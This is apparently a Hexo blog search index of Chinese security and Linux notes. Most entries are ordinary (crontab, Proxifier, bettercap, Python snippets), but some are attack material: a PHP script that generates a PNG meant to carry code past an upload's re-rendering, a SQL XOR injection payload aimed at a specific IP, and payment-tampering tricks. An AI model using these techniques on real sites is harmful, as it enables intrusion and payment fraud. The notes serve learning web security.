<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux命令crontab</title>
      <link href="/categories/Linux/linux%E5%91%BD%E4%BB%A4crontab/"/>
      <url>/categories/Linux/linux%E5%91%BD%E4%BB%A4crontab/</url>
      
        <content type="html"><![CDATA[<p> crontab：定时任务的守护进程，精确到分，设计秒的我们一般写脚本 –&gt;相当于闹钟 </p><p>日志文件: ll /var/log/cron*<br>编辑文件： vim /etc/crontab<br>进程：ps -ef | grep crond ==&gt; /etc/init.d/crond restart<br>作用：定时备份，实时备份 </p><a id="more"></a><p> <a href="https://www.cnblogs.com/ftl1012/p/crontab.html" target="_blank" rel="noopener">https://www.cnblogs.com/ftl1012/p/crontab.html</a> </p><h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><h3 id="安装crontab"><a href="#安装crontab" class="headerlink" title="安装crontab"></a>安装crontab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install crontabs</span><br></pre></td></tr></table></figure><h3 id="crontab服务操作说明"><a href="#crontab服务操作说明" class="headerlink" title="crontab服务操作说明"></a>crontab服务操作说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sbin&#x2F;service crond start &#x2F;&#x2F;启动服务</span><br><span class="line"> </span><br><span class="line">&#x2F;sbin&#x2F;service crond stop &#x2F;&#x2F;关闭服务</span><br><span class="line"> </span><br><span class="line">&#x2F;sbin&#x2F;service crond restart &#x2F;&#x2F;重启服务</span><br><span class="line"> </span><br><span class="line">&#x2F;sbin&#x2F;service crond reload &#x2F;&#x2F;重新载入配置</span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usage:  crontab [-u user] file</span><br><span class="line">        crontab [-u user] [ -e | -l | -r ]</span><br><span class="line">                (default operation is replace, per 1003.2)</span><br><span class="line">        -e      (edit user&#39;s crontab)</span><br><span class="line">        -l      (list user&#39;s crontab)</span><br><span class="line">        -r      (delete user&#39;s crontab)</span><br><span class="line">        -i      (prompt before deleting user&#39;s crontab)</span><br><span class="line">        -s      (selinux context)</span><br></pre></td></tr></table></figure><h2 id="定时任务分类"><a href="#定时任务分类" class="headerlink" title="定时任务分类"></a>定时任务分类</h2><p> Linux下的任务调度分为两类，系统任务调度和用户任务调度。</p><ul><li>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。<pre><code>在/etc/crontab文件，这个就是系统任务调度的配置文件。</code></pre></li><li>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。<pre><code>用户可以使用 crontab 工具来定制自己的计划任务。在crontab 文件都被保存在/var/spool/cron目录中。其文件名与用户名一致 </code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali下卸载软件</title>
      <link href="/categories/Linux/Kali-Linux/kali%E4%B8%8B%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/"/>
      <url>/categories/Linux/Kali-Linux/kali%E4%B8%8B%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>卸载命令</p><a id="more"></a><p>ali中主要为2种卸载方法：<br>1、apt<br>2、dpkg</p><p>使用apt的方式有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove [package]</span><br><span class="line">apt-get remove --purge # ------(package 删除包，包括删除配置文件等) </span><br><span class="line">apt-get autoremove --purge # ----(package 删除包及其依赖的软件包+配置文件等</span><br></pre></td></tr></table></figure><p>使用dpkg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -r     #移除一个已安装的包。</span><br><span class="line">dpkg -P    #完全清除一个已安装的包。和 remove 不同的是，remove 只是删掉数据和可执行文件，</span><br></pre></td></tr></table></figure><p>purge 另外还删除所有的配制文件。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注入</title>
      <link href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E6%B3%A8%E5%85%A5/"/>
      <url>/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS<br>注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预<br>期命令或访问数据。</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 应用安全风险 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片上传绕过二次渲染</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>二次渲染绕过</p><a id="more"></a><p>上传png</p><p>直接运行国外大神脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php png.php</span><br></pre></td></tr></table></figure><p>若报错如下，参考 <a href="https://www.cnblogs.com/xd502djj/p/4293180.html" target="_blank" rel="noopener">https://www.cnblogs.com/xd502djj/p/4293180.html</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught Error: Call to undefined function imagecreatetruecolo</span><br><span class="line">r()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑支付漏洞</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>支付漏洞</p><a id="more"></a><p>支付漏洞的理解通常是篡改价格</p><p>例一：</p><p>充值的时候，程序只判断订单没有支付成功，但没有判断金额，例如生成订单跳至支付宝页面，在原网站上点支付失败，这时 可以修改订单，改成更大的金额（订单号没变），回到支付宝支付界面，支付成功，程序并没有重新核对支付宝实际的金额，只是把订单改为已支付。</p><p>例二：</p><p>使用余额支付，把数量改为负数，扣除余额时，负负得正，这时余额增加。</p><p>如何测试交易中是否存在逻辑漏洞？</p><p>1.在购买过程中修改产品价格，数量</p><p>2.在支付时修改总价格或者优惠价格</p><p>3.订单生成后，编辑订单把A商品的价格改为B商品的价格，实现低价支付，测试时修改数量，单价，优惠价格参数为负数，小数，无限大，看是否生成订单，能生成进入支付及说明存在逻辑漏洞了</p><p>交易中支付漏洞的几种常见类型？</p><p>1.修改金额</p><p>2.修改商品数量</p><p>3.修改优惠金额</p><p>4.修改数量，单价，优惠价格参数为负数，小数，无限大</p><p>5.商品价格更改</p><p>6.支付key泄露</p><p>实际安全中会有一些特别的,反正各种能改的参数都去尝试，个数，单价，优惠卷个数，单价，总额。每个值都可能存在问题，就看服务自身处理是否有问题了</p><p>支付漏洞一般分为三类：</p><p>在支付过程中直接发含有支付金额的数据包</p><p>没有对购买的数量进行限制</p><p>程序的异常处理（如：99999999，月份过多超出）</p><p>还有更多的利用方案…</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之异或注入</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>异或注入</p><a id="more"></a><p> 两个同为真的条件做异或，结果为假 </p><p> 两个同为假的条件做异或，结果为假 </p><p> 一个条件为真，一个条件为假，结果为真 </p><p> null与任何条件（真、假、null）做异或，结果都为null </p><p>xor与^区别：</p><p> ^运算符会做位异或运算 如1^2=3 1^2=3 </p><p> xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 </p><p>用处：</p><p>可用于判断过滤<br> <a href="https://link.jianshu.com?t=http%3A%2F%2F120.24.86.145%3A9004%2F1ndex.php%3Fid%3D1' target="_blank" rel="noopener"">http://120.24.86.145:9004/1ndex.php?id=1’</a>^(length(‘union’)=5)%23<br> 当union被过滤时1^0 输出id=1<br> 当union没被过滤时 1 ^ 1 输出 id=0<br> 回显  error</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxifier使用教程</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>转载自：<a href="https://blog.csdn.net/u013066730/article/details/88788191" target="_blank" rel="noopener">https://blog.csdn.net/u013066730/article/details/88788191</a></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>成功搭建使用shadowshocks实现代理访问google，然而只能浏览器代理方式使用，不能其他程序使用代理，不利于白帽子匿名安全检测，下面将介绍利用Proxifier实现全局代理。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官网发布多个版本，其中便携版不需要安装，直接双击运行，安装版则直接安装即可<br>  Windows便携版：官网地址<br>  Windows安装版：官网地址<br>  Mac版：官网地址</p><h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>1.打开软件点击Profile，接下来配置的三步顺序</p><p>代理服务器配置<br>代理规则设置<br>域名解析设置</p><p><img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839332541.png" alt="1590839332541"></p><p>2.配置第一步</p><p>点击Proxy Server按钮<br>add<br>输入本地shadowshocks的ip（默认127.0.0.1）和端口（默认1080）<br>选择SHOCKS Versin 5<br>然后点击check<br>OK</p><p><img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839363439.png" alt="1590839363439"></p><p>显示Proxy is ready to work with Proxfier! 则此步骤配置成功，否则认真检查端口是否正确以及shadowsocks是否运行。</p><p> <img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839378143.png" alt="1590839378143"></p><p>接下来的两步配置至关重要，配置错误可能导致全局代理失败或者循环代理<br>3.配置第二步</p><p>点击Proxification Rule<br>选中localhost,点击Edit<br>Target hosts处添加shadowshocks代理服务器的IP地址（以123.123.123.123示例）<br>Action选择Direct(直连)<br>OK</p><p> <img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839417697.png" alt="1590839417697"></p><p>注：此配置步骤允许发送到代理服务器的数据包通过，防止循环代理错误<br>配置后如图</p><p> <img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839431325.png" alt="1590839431325"></p><p>4.配置第三步</p><p>点击Name Resolution<br>选择第二个Resolve hostnames through proxy（通过代理服务器解析域名）<br>OK</p><p> <img src="../proxifier%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1590839451083.png" alt="1590839451083"></p><p>5.至此，全局代理已经配置完毕，用CMD命令nslookup <a href="http://www.google.com测试是否成功获取其IP地址，也可以直接访问www.ip138.com查看当前外网IP地址。" target="_blank" rel="noopener">www.google.com测试是否成功获取其IP地址，也可以直接访问www.ip138.com查看当前外网IP地址。</a><br>其他使用</p><p>Proxifier的规则设置十分灵活强大，可以默认所有数据流量都通过代理，即以上设置。<br>同时也可以通过对特殊应用或者端口进行更细粒度的代理设置，比如想要QQ数据包不通过代理，只需要添加规则，应用选择QQ,直连即可<br>如果想尽量减小代理的流量 也可以修改默认规则为直连，然后添加需要的特殊应用为代理访问</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxifier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bettercap工具使用</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/bettercap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/bettercap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>内网 网络安全工具，用与抓包，中间人</p><p><a href="https://github.com/bettercap/bettercap" target="_blank" rel="noopener">https://github.com/bettercap/bettercap</a> </p><a id="more"></a><h2 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h2><p>kali 上，apt-get install bettercap， 安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface 网卡</span><br></pre></td></tr></table></figure><p>help或 ？查看<code>帮助信息</code>和模块是否开启</p><p>get 查看变量</p><p>set 设置变量，退出重连后恢复默认</p><p>quit退出</p><p>模块名加on或者off，开，关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.recon on</span><br><span class="line">net.show 显示主机缓存列表</span><br><span class="line">net.show by seen&#x2F;sent&#x2F;revd 排列顺序</span><br></pre></td></tr></table></figure><h3 id="帮助信息1"><a href="#帮助信息1" class="headerlink" title="帮助信息1"></a>帮助信息1</h3><table><thead><tr><th>参数</th><th>介绍</th></tr></thead><tbody><tr><td>-autostart string</td><td>用逗号分隔要自动启动的模块列表(默认“events.stream”)</td></tr><tr><td>-caplet string</td><td>从该文件中读取命令并在交互式会话中执行它们</td></tr><tr><td>-cpu-profile file</td><td>编写cpu配置文件</td></tr><tr><td>-debug</td><td>打印调试信息</td></tr><tr><td>-env-file string</td><td>如果找到此文件中的环境变量，则将其设置为空，以禁用环境持久性</td></tr><tr><td>-eval string</td><td>在交互式会话中使用”;”分隔一个或多个命令，通过命令行设置变量</td></tr><tr><td>-gateway-override string</td><td>使用提供的IP地址而不是默认网关。如果未指定或无效，将使用默认网关</td></tr><tr><td>-iface string</td><td>要绑定到的网络接口，如果为空，则自动选择默认接口</td></tr><tr><td>-mem-profile file</td><td>将内存配置文件写入文件</td></tr><tr><td>-no-colors</td><td>禁用输出颜色效果</td></tr><tr><td>-no-history</td><td>禁用交互式会话历史文件</td></tr><tr><td>-silent</td><td>取消所有非错误的日志</td></tr><tr><td>-version</td><td>打印版本并退出</td></tr></tbody></table><h3 id="帮助信息2"><a href="#帮助信息2" class="headerlink" title="帮助信息2"></a>帮助信息2</h3><table><thead><tr><th>命令</th><th>介绍</th></tr></thead><tbody><tr><td>help MODULE</td><td>列出可用的命令，如果没有提供模块名，则显示模块特定的帮助</td></tr><tr><td>active</td><td>显示有关活动模块的信息</td></tr><tr><td>quit</td><td>关闭会话并退出</td></tr><tr><td>sleep SECONDS</td><td>在给定的时间内睡眠</td></tr><tr><td>get NAME</td><td>获取变量名的值，对所有变量单独使用，或将NAME作为通配符</td></tr><tr><td>set NAME VALUE</td><td>设置变量名的值</td></tr><tr><td>read VARIABLE PROMPT</td><td>显示一个提示，要求用户输入将被保存在变量中</td></tr><tr><td>clear</td><td>清除屏幕</td></tr><tr><td>include CAPLET</td><td>在当前会话中加载并运行这个CAPLET</td></tr><tr><td>! COMMAND</td><td>执行shell命令并打印其输出</td></tr><tr><td>alias MAC NAME</td><td>给定端点的MAC地址，为其分配别名</td></tr></tbody></table><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p> <a href="https://www.bettercap.org/usage/" target="_blank" rel="noopener">https://www.bettercap.org/usage/</a> </p><h2 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h2><p> <a href="https://www.bettercap.org/modules/" target="_blank" rel="noopener">https://www.bettercap.org/modules/</a> </p><p>开启模块前设置，模块启动后，再修改将在下一次开启后生效</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="加载脚本"><a href="#加载脚本" class="headerlink" title="加载脚本"></a>加载脚本</h3><p>bett/caplets</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python连接mysql并查表</title>
      <link href="/categories/python/python%E8%BF%9E%E6%8E%A5mysql%E5%B9%B6%E6%9F%A5%E8%A1%A8/"/>
      <url>/categories/python/python%E8%BF%9E%E6%8E%A5mysql%E5%B9%B6%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>连接数据库，查表</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment"># Created by 0vox on 2020/5/26</span></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">from</span> mysql.connector <span class="keyword">import</span> errorcode</span><br><span class="line"><span class="keyword">from</span> tabulate <span class="keyword">import</span> tabulate</span><br><span class="line"><span class="comment"># import datetime</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span><span class="params">()</span>:</span></span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="string">'user'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'testroot'</span>,</span><br><span class="line">        <span class="string">'host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'database'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'raise_on_warnings'</span>: <span class="literal">True</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cnx = mysql.connector.connect(**config)</span><br><span class="line">        print(<span class="string">"连接成功"</span>)</span><br><span class="line">        cursor = cnx.cursor()</span><br><span class="line"></span><br><span class="line">        query = (<span class="string">"SELECT id, username, password FROM users"</span>)</span><br><span class="line">        cursor.execute(query)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出格式1</span></span><br><span class="line">        table_user = [<span class="string">"id"</span>, <span class="string">"username"</span>, <span class="string">"password"</span>]</span><br><span class="line">        print(tabulate(cursor, table_user, tablefmt=<span class="string">"pipe"</span>))</span><br><span class="line">        <span class="comment"># 输出格式2</span></span><br><span class="line">        <span class="comment"># for (id, username, password) in cursor:</span></span><br><span class="line">        <span class="comment">#     print("&#123;&#125;, &#123;&#125;, &#123;&#125;".format(</span></span><br><span class="line">        <span class="comment">#         id, username, password))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">if</span> err.errno == errorcode.ER_ACCESS_DENIED_ERROR:</span><br><span class="line">            print(<span class="string">"Something is wrong with your user name or password"</span>)</span><br><span class="line">        <span class="keyword">elif</span> err.errno == errorcode.ER_BAD_DB_ERROR:</span><br><span class="line">            print(<span class="string">"Database does not exist"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(err)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cursor.close()</span><br><span class="line">        cnx.close()</span><br><span class="line">        print(<span class="string">"已断开连接"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    conn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进度条</title>
      <link href="/categories/python/python%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/categories/python/python%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<p>进度条</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment"># Created by 0vox on 2020/5/27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">progress_bar</span><span class="params">(portion, total)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    total 总数据大小，portion 已经传送的数据大小</span></span><br><span class="line"><span class="string">    :param portion: 已经接收的数据量</span></span><br><span class="line"><span class="string">    :param total: 总数据量</span></span><br><span class="line"><span class="string">    :return: 接收数据完成，返回True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    part = total / <span class="number">50</span>  <span class="comment"># 1%数据的大小</span></span><br><span class="line">    count = math.ceil(portion / part)</span><br><span class="line">    sys.stdout.write(<span class="string">'\r'</span>)</span><br><span class="line">    sys.stdout.write((<span class="string">'[%-50s]%.2f%%'</span> % ((<span class="string">'&gt;'</span> * count), portion / total * <span class="number">100</span>)))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> portion &gt;= total:</span><br><span class="line">        sys.stdout.write(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 调用方式</span></span><br><span class="line">    portion = <span class="number">0</span></span><br><span class="line">    total = <span class="number">254820000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        portion += <span class="number">1024</span></span><br><span class="line">        sum = progress_bar(portion, total)</span><br><span class="line">        <span class="keyword">if</span> sum:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"ok"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
